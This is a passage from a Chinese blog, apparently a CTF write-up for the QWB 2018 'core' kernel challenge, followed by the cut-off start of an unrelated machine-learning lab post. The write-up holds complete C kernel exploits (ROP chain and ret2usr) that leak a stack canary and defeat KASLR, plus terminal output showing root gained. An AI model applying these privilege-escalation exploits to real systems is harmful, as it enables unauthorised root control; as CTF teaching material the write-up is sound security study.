class="comment">/* popfq:弹出堆栈到EFLAGS寄存器 */</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">    <span class="comment">/* iretq:返回到用户空间(在执行iretq之前,先执行swapgs指令) */</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip(后门函数)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>); <span class="comment">/* 最后还是会调用core_write(可能要看源码) */</span></span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>)); <span class="comment">/* 全局变量name中拷贝数据到内核局部变量中 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先介绍几个概念：</p>
<ul>
<li>raw_vmlinux_base：kaslr 加工前的内核加载基址</li>
<li>vmlinux_base：kaslr 加工后的内核加载基址</li>
</ul>
<p>kaslr，类似ASLR，内核基址地址加载随机化</p>
<ul>
<li>通过泄露内核地址，通过偏移计算出内核基址（如果没有开PIE，就可以直接获取 raw_vmlinux_base）</li>
<li>再计算 kaslr 对内核基址的偏移（offset = vmlinux_base - raw_vmlinux_base）</li>
<li>用 offset 修正其他函数的地址</li>
</ul>
<p>官方exp选择从“内核符号表”泄露以下两个函数：</p>
<ul>
<li>prepare_kernel_cred：构造一个新的 cred </li>
<li>commit_creds：更新当前进程的 cred</li>
<li>commit_creds(prepare_kernel_cred(0))：构造一个 cred(0)，并把它更新为当前进程的 cred</li>
</ul>
<p>在主函数中，程序打开了 proc 目录中的某个文件（这个 proc 和 PROC 虚拟文件系统有关），然后调用 ioctl 来执行驱动函数，利用其本身的漏洞泄露 canary，触发 ROP链（就是想方设法构造出“commit_creds(prepare_kernel_cred(0))”，并返回用户空间）</p>
<p>最后看看这几个偏移是怎么计算出来的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/\xe5\xbc\xba\xe7\xbd\x91\xe6\x9d\xaf2018/give_to_player/vmlinux&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.8</span></span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0xffffffff81000000</span>)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - <span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(vmlinux.sym[<span class="string">&#x27;prepare_kernel_cred&#x27;</span>] - <span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0x9cce0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.022212</span>] Spectre V2 : Spectre mitigation: LFENCE <span class="keyword">not</span> serializing, switchie</span><br><span class="line">udhcpc: started, v1<span class="number">.26</span><span class="number">.2</span></span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending select <span class="keyword">for</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">udhcpc: lease of <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> obtained, lease time <span class="number">86400</span></span><br><span class="line">/ $ whoami</span><br><span class="line">chal</span><br><span class="line">/ $ /tmp/<span class="built_in">exp</span></span><br><span class="line">[*]status has been saved.</span><br><span class="line">commit_creds addr: <span class="number">0xffffffff8b09c8e0</span></span><br><span class="line">vmlinux_base addr: <span class="number">0xffffffff8b000000</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffff8b09cce0</span></span><br><span class="line">[*]<span class="built_in">set</span> off to <span class="number">64</span></span><br><span class="line">[*]read to buf.</span><br><span class="line">[+]canary: <span class="number">0x12ce77bc03269b00</span></span><br><span class="line">[*]copy from user with size: <span class="number">-65280</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>除了 prepare_kernel_cred，还有其他方式来提权，这里介绍一下 ret2usr：</p>
<ul>
<li>ret2usr 攻击利用了用户空间的进程不能访问内核空间，但内核空间能访问用户空间这个特性来定向内核代码或数据流指向用户控件，以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作</li>
</ul>
<p>以本题为例，exp 分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-- ret2usr --&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 注意:&quot;prepare_kernel_cred&quot;和&quot;commit_creds&quot;都是地址,需要用函数指针执行 */</span></span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* 相当于执行&quot;commit_creds(prepare_kernel_cred(0));&quot; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary : %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">8</span>]  = canary ; </span><br><span class="line">    rop[<span class="number">9</span>]  = <span class="number">0</span>; </span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="keyword">size_t</span>)get_shell; </span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] DEBUG: &quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    write(fd, rop, <span class="number">0x30</span> * <span class="number">8</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面的过程都相同，但 ROP 链的构造有所不同</p>
<ul>
<li>直接ROP：<ul>
<li>把 prepare_kernel_cred 和 commit_creds 拆散，放到 ROP 链中执行</li>
</ul>
</li>
<li>ret2usr：<ul>
<li>直接返回到用户空间构造的 <code>commit_creds(prepare_kernel_cred(0))</code>（通过函数指针实现）来提权</li>
<li>虽然这两个函数位于内核空间，但此时我们是 <code>ring 0</code> 特权，因此可以正常运行</li>
<li>之后也是通过 <code>swapgs; iretq</code> 返回到用户态来执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code></li>
</ul>
</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.021763</span>] Spectre V2 : Spectre mitigation: LFENCE <span class="keyword">not</span> serializing, switchie</span><br><span class="line">udhcpc: started, v1<span class="number">.26</span><span class="number">.2</span></span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending select <span class="keyword">for</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">udhcpc: lease of <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> obtained, lease time <span class="number">86400</span></span><br><span class="line">/ $ whoami</span><br><span class="line">chal</span><br><span class="line">/ $ /tmp/exp2</span><br><span class="line">commit_creds addr: <span class="number">0xffffffffaea9c8e0</span></span><br><span class="line">vmlinux_base addr: <span class="number">0xffffffffaea00000</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffffaea9cce0</span></span><br><span class="line">[*]status has been saved.</span><br><span class="line">[*]<span class="built_in">set</span> off to <span class="number">64</span></span><br><span class="line">[*]read to buf.</span><br><span class="line">[*]canary : <span class="number">0xedec5afb6b0a1800</span></span><br><span class="line">[*] DEBUG: </span><br><span class="line"></span><br><span class="line">[*]copy from user with size: <span class="number">-65280</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这是我的第一个 kernel pwn，刚刚进入 kernel 感觉有点迷茫，不知道该获取什么信息，修改什么数据，完成此题后我的思路清晰了一点：</p>
<ul>
<li>驱动函数是 kernel 中容易出问题的点，可以用C语言中的 ioctl 来执行驱动函数</li>
<li>/proc/kallsyms 是内核符号表，拥有内核符号的地址，需要收集此信息</li>
<li>kaslr，类似ASLR，内核基址地址加载随机化</li>
<li>使用 <code>commit_creds(prepare_kernel_cred(0))</code> 进行提权（可以放入ROP链中，也可以通过函数指针执行这个整体）</li>
</ul>
<p>踩到的坑：</p>
<ul>
<li>start.sh 中给的内存太小，导致 kernel 跑不起来</li>
<li>题目自带的 vmlinux 和 core.cpio 中的 vmlinux 不一样，导致 gadget 出问题</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/10/Machine-Learning-Lab3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/10/Machine-Learning-Lab3/" class="post-title-link" itemprop="url">Machine-Learning-Lab3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-10 22:59:50" itemprop="dateCreated datePublished" datetime="2022-05-10T22:59:50+08:00">2022-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:08" itemprop="dateModified" datetime="2022-10-10T00:08:08+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现一对多逻辑回归和神经网络来识别手写数字</p>
<ul>
<li>ex3.m - Octave/MATLAB 脚本帮助您完成第1部分</li>
<li>ex3 nn.m - Octave/MATLAB 脚本帮助您完成第2部分</li>
<li>ex3data1.mat - 手写数字训练集</li>
<li>ex3weights.mat - 神经网络训练的初始权重</li>
<li>submit.m - 提交脚本，将您的解决方案发送到我们的服务器</li>
<li>displayData.m - 帮助可视化数据集的函数</li>
<li>fmincg.m - 功能最小化例行程序（类似于fminunc）</li>
<li>sigmoid.m - Sigmoid 函数（假设陈述）</li>
<li>[?] lrCostFunction.m - 逻辑回归成本函数</li>
<li>[?] oneVsAll.m - 训练一个一对多类分类器</li>
<li>[?] predictOneVsAll.m - 使用一对多类分类器进行预测</li>
<li>[?] predict.m - 神经网络预测函数</li>
</ul>
<h2 id="Multi-class-Classification（多类分类）"><a href="#Multi-class-Classification（多类分类）" class="headerlink" title="Multi-class Classification（多类分类）"></a>Multi-class Classification（多类分类）</h2><p>在本练习中，您将使用逻辑回归和神经网络识别手写数字（从0到9）</p>
<ul>
<li>如今，自动手写数字识别被广泛使用——从识别信封上的邮政编码到识别银行支票上的金额</li>
<li>本练习将向您展示如何将所学的方法用于此分类任务</li>
<li>在练习的第一部分中，您将扩展以前的逻辑回归实现，并将其应用于 one-vs-all（一对多）分类</li>
</ul>
<p>ex3data1.mat 中提供了一个数据集包含5000个手写数字训练示例（这个 mat 格式意味着数据已以 Octave/MATLAB 矩阵格式保存，而不是像 csv-file 那样的 ASCII 格式），可以使用 load 命令将这些矩阵直接读入程序，加载后，正确尺寸和值的矩阵将出现在程序的内存中，矩阵将已经命名，因此不需要为它们指定名称</p>
<ul>
<li>ex3data1.mat 中有5000个训练示例，每个样例都是一个“手写数字”</li>
<li>其中每个训练示例的“手写数字”是20像素乘20像素灰度图像，每个像素由一个浮点数表示，表示该位置的灰度强度</li>
<li>20×20 的像素网格被“展开”成400维向量，这些训练示例中的每一个都成为我们的数据矩阵X中的一行</li>
<li>这给了我们一个 5000×400 的矩阵X，其中每一行都是“手写数字”图像的训练示例</li>
<li>训练集的第二部分是 5000 维向量y，其中包含训练集的标签</li>
<li>为了与 Octave/MATLAB 索引更兼容，在没有零索引的情况下，我们将数字0映射到值10，因此，“0”数字标记为“10”，而数字“1”至“9”按其自然顺序标记为“1”至“9”</li>
</ul>
<h2 id="Visualizing-the-data（可视化数据）"><a href="#Visualizing-the-data（可视化数据）" class="headerlink" title="Visualizing the data（可视化数据）"></a>Visualizing the data（可视化数据）</h2><p>您将首先可视化训练集的一个子集</p>
<ul>
<li>在 ex3.m 的第1部分：代码从X中随机选择100行，并将这些行传递给 displayData 函数</li>
<li>此函数将每行映射到 20x20 像素的灰度图像，并一起显示图像</li>
<li>我们已经提供了 displayData 函数，我们鼓励您检查代码，看看它是如何工作的，运行此步骤后，应该会看到一个图像</li>
</ul>
<p>先看一下 displayData 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_data</span>(<span class="params">x</span>):</span></span><br><span class="line">	(m,n) = x.shape</span><br><span class="line">	<span class="comment"># 设置每个小图例的宽度和高度</span></span><br><span class="line">	width = np.<span class="built_in">round</span>(np.sqrt(n)).astype(<span class="built_in">int</span>)</span><br><span class="line">	height = (n / width).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 设置图片的行数和列数</span></span><br><span class="line">	rows = np.floor(np.sqrt(m)).astype(<span class="built_in">int</span>)</span><br><span class="line">	cols = np.ceil(m / rows).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 设置图例之间的间隔</span></span><br><span class="line">	pad = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 初始化图像数据</span></span><br><span class="line">	display_array = -np.ones((pad + rows*(height+pad), pad + cols*(width + pad)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 把数据按行和列复制进图像中(10x10的表格)</span></span><br><span class="line">	current_image = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span 